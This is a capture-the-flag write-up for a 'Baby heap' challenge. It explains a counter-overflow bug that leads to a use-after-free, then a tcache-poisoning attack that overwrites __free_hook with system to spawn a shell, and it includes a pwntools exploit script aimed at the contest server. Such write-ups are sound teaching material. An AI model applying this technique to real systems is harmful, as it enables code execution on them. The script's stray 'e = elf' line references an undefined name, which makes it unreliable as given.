# Baby heap

> Let's get you all warmed up with a classic little 4-function heap challenge, with a twist ofc.
>
> `nc hack.scythe2021.sdslabs.co 17169`
>
> `static.scythe2021.sdslabs.co/static/babyHeap/libc-2.31.so`
>
> `static.scythe2021.sdslabs.co/static/babyHeap/babyHeap`



As stated in the description, we can allocate, free, edit and view chunks. Sounds like a simple heap UAF/double free right? Let's look into the code.

When we allocate chunks, we can either allocate small (128 bytes), medium (512 bytes) or large (1040 bytes) chunks. This gives us access to both the tcache and unsort bins, which is really useful for leaking libc addresses and stuff.

The `allocate_chunks` function is called to allocate chunks:

```c
unsigned __int64 allocate_chunks(){
  unsigned int v1; // [rsp+Ch] [rbp-14h] BYREF
  int v2; // [rsp+10h] [rbp-10h] BYREF
  unsigned int i; // [rsp+14h] [rbp-Ch]
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  printf("How many chunks do you wanna allocate: ");
  v1 = 0;
  __isoc99_scanf("%u", &v1);
  puts("Select the size: ");
  chunk_menu();
  v2 = 0;
  __isoc99_scanf("%d", &v2);
  for ( i = 0; i < v1; ++i ){
    increment_a();
    allocate_chunk(v2);
  }
  return __readfsqword(0x28u) ^ v4;
}
__int64 increment_a(){
  return (unsigned int)++chunk_index_a;
}
```

The user specifies the number of chunks, as well as the chunk size by entering either 1, 2 or 3. For each chunk the user wants to create, `chunk_index_a` is incremented and the `allocate_chunk` function is called with the chunk size choice.

```c
void __fastcall allocate_chunk(int choice)
{
  int v1; // ebx
  int v2; // [rsp+1Ch] [rbp-14h]

  if ( choice == 3 ) {
    v2 = 128;
  }  else {
    if ( choice > 3 )
      return;
    if ( choice == 1 ) {
      v2 = 1040;
    } else{
      if ( choice != 2 )
        return;
      v2 = 512;
    }
  }
  if ( (unsigned int)chunk_index_b > 0x10 )
    exit(0);
  v1 = chunk_index_b++;
  chunks[v1] = malloc(v2);
}
```

One thing to note is the function returns if `choice > 3`, and there is no bounds checking elsewhere. If the choice is valid, `chunk_index_b` is incremented and a chunk is `malloc`ed and stored in the chunks array. Now, we have two variables that store the number of chunks allocated. 

However, we can get these two variables to differ by entering a chunk size choice that is greater than 3. This will cause `chunk_index_a` to be incremented, but `allocate_chunk` will return before `chunk_index_b++` is executed, so `chunk_index_a` can be manipulated to be greater than `chunk_index_b`.

Let's look at the free function now:

```c
unsigned __int64 free_last_chunk(){
  unsigned __int64 result; // rax

  result = (unsigned int)chunk_index_b;
  if ( chunk_index_b ) {
    if ( chunk_index_a > (unsigned int)chunk_index_b ) {
      fwrite("Hacking detected!!!\nExiting...\n", 1uLL, 0x1FuLL, stderr);
      exit(0);
    }
    free((void *)chunks[--chunk_index_b]);
    --chunk_index_a;
    result = (unsigned __int64)chunks;
    chunks[chunk_index_a] = 0LL;
  }
  return result;
}
```

We're not allowed to specify an index to free, so we can only free the last allocated chunk. Also, `chunk_index_a` must not be greater than `chunk_index_b`, which disrupts the bug we found earlier. Additionally, the pointer to the freed chunk is zeroed out, so there is no use after free here. However, the freed chunk is indexed by `chunk_index_b`, while `chunk_index_a` controls which chunk is zeroed out. If we can these two variables to differ, we can get a use after free!

However, it seems this is prevented by the check that `chunk_index_a <= chunk_index_b`. When dealing with these kinds of problems, there are usually 2 bugs to consider:

- behaviour with negative numbers/integer underflow
- behaviour with very large numbers (integer overflow)

If we can increment `chunk_index_a` to a very large value, it will overflow and become 0. This value is around 4 billion, which means it will take quite a bit of time to run. Another problem is we need to ensure that `chunk_index_a` is not negative and it doesn't overwrite any pointer we will need.

Anyway we've gone through all the bugs in this program, so let's go on to the exploit.

## Exploit

Our exploit will follow the general pattern of 

- free large chunk to unsort bin
- read chunk metadata to leak libc base
- write chunk metadata of tcache chunk to `__free_hook` or `__malloc_hook`
- malloc chunks until a pointer to one of the hooks is returned
- write one_gadget to that hook
- trigger one_gadget
- get shell!

For the exploit, I allocated a large (1040 byte) chunk and 2 small (128 byte) chunks. To ensure that `chunk_index_a` is zeroing out chunk pointers that we don't need, I allocated 3 chunks (size doesn't matter here) before allocating the 3 chunks that we need.

At this point, both chunk indexes are 6. 

Then, I "allocated" `4294967293` chunks of size `10`, which doesn't exist. This results in `chunk_index_a` overflowing to 3, while `chunk_index_b` remains 6. Thus, when we free the 3 active chunks (3,4,5), these chunks get freed, but the pointers to (0,1,2) get zeroed out instead.

Once we've freed these chunks, we can view the contents of chunk 3, which leaks the libc base. Then, we write `__free_hook` to the `next` pointer of chunk 4 (which is freed to the tcache). Thus, when we `malloc` a couple of chunks, we will end up with a pointer to the `__free_hook`. 

At this point, `chunk_index_a` is 0, while `chunk_index_b` is 3. I then allocated 3 more small chunks (probably a bit too many), and found that chunk 4 points to `__free_hook`.

We can then grab a one gadget and write its address to `__free_hook`. Now, all we need to do is free a chunk, and we will get our shell! 

Unfortunately, I couldn't find a suitable one gadget, since the `rdx` register was polluted with some data from other function calls. I was stuck here for quite a while as I tried to use different methods to change the value of this register.

Eventually, I decided to try a new approach. Looking through the documentation for `__free_hook`, it is actually called with `$rdi=address of freed buffer`. Therefore, if we write the address of `system` to `__free_hook` and free a chunk that starts with the string `/bin/sh`, we can get a shell! Fortunately, with a little bit of tweaking the heap layout, I was able to get this attack to work.

## Script

```python
#!/usr/bin/env python3
from pwn import *

exe = ELF("./babyHeap")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe

def malloc(num: int, size: int):
    p=q
    p.recvuntil('>>')
    p.sendline('1')
    p.recvuntil('How many chunks do you wanna allocate:')
    p.sendline(str(num))
    p.recvuntil('>>')
    p.sendline(str(size))

def view(index: int):
    p=q
    p.recvuntil('>>')
    p.sendline('4')
    p.recvuntil('Index to view:')
    p.sendline(str(index))

def free():
    p=q
    p.recvuntil('>>')
    p.sendline('2')


def edit(index: int, size: int, data: bytes|str):
    # Workaround for weird vs code bug
    p=q
    p.recvuntil('>>')
    p.sendline('3')
    p.recvuntil('Index to edit:')
    p.sendline(str(index))
    p.recvuntil('Enter size:')
    p.sendline(str(size))
    p.clean()
    p.sendline(data)


def conn():
    if args.LOCAL:
        return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
    else:
        return remote("hack.scythe2021.sdslabs.co", 17169)

q = None
def main():
    r = conn()
    e = elf
    p = r
    global q
    q = p

    malloc(4,1)
    malloc(2,3)
    malloc(4294967293,10)
    free()
    free()
    free()
    print("Freed!")
    view(3)
    leak = p.recvline(keepends=False)[1:]
    print(leak, len(leak))
    leak = u64(leak + b"\0\0")
    libc.address = leak-0x1ebbe0
    print(hex(leak), hex(libc.address))
    edit(4,9,p64(libc.sym.__free_hook))

    print("Wrote free hook")
    malloc(3,3)
    edit(4,9, p64(libc.sym.system))
    malloc(1,3)
    edit(6,8,b"/bin/sh")

    free()

    r.interactive()


if __name__ == "__main__":
    main()
```

